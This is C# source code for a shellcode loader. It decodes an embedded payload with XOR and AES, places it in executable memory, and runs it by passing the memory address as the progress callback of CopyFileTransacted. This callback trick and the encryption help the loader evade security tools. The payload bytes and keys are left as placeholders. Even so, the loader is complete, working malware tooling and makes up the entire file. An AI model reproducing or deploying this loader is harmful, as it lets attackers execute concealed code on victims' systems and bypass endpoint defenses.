using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace CopyFileTransacted
{
    internal class Program
    {
        private static byte[] XorEncDec(byte[] input, byte[] theKey)
        {
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                int length = i % theKey.Length;
                mixed[i] = (byte)(input[i] ^ theKey[length]);
            }
            return mixed;
        }

        private static byte[] AESDecrypt(byte[] cipherData, byte[] aes_key, byte[] aes_iv)
        {
            MemoryStream ms = new MemoryStream();
            Rijndael alg = Rijndael.Create();
            alg.Key = aes_key;
            alg.IV = aes_iv;
            CryptoStream cs = new CryptoStream(ms, alg.CreateDecryptor(), CryptoStreamMode.Write);
            cs.Write(cipherData, 0, cipherData.Length);
            cs.Close();
            byte[] decryptedData = ms.ToArray();
            return decryptedData;
        }

        static void Main(string[] args)
        {
            byte[] encryptedShellcode = { ENCRYPTED_SHELL_CODE_BYTES };
            byte[] XorKey = { XOR_KEY_BYTES };
            byte[] AesKey = { AES_KEY_BYTES };
            byte[] AesIv = { AES_IV_BYTES };
            byte[] payload = new byte[] { };
            byte[] aesEncrypted = XorEncDec(encryptedShellcode, XorKey);
            payload = AESDecrypt(aesEncrypted, AesKey, AesIv);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc,
                payload.Length, 0x20/*RX*/, out oldProtect);

            string szTempFile = System.IO.Path.GetTempFileName();

            IntPtr hTransaction = CreateTransaction(IntPtr.Zero, IntPtr.Zero, 0, 0, 0, 0, string.Empty);
            CopyFileTransacted(@"C:\Windows\notepad.exe", szTempFile, hAlloc, IntPtr.Zero, 0, 0x0, hTransaction);

            //Cleanup
            System.IO.File.Delete(szTempFile);
            CloseHandle(hTransaction);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("KtmW32.dll")]
        static extern IntPtr CreateTransaction(IntPtr lpTransactionAttributes, IntPtr UOW, uint CreateOptions, uint IsolationLevel, uint IsolationFlags, uint Timeout, string Description);

        [DllImport("kernel32.dll")]
        static extern bool CopyFileTransacted(string lpExistingFileName, string lpNewFileName,
            IntPtr lpProgressRoutine, IntPtr lpData, Int32 pbCancel,
            uint dwCopyFlags, IntPtr hTransaction);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);
    }
}
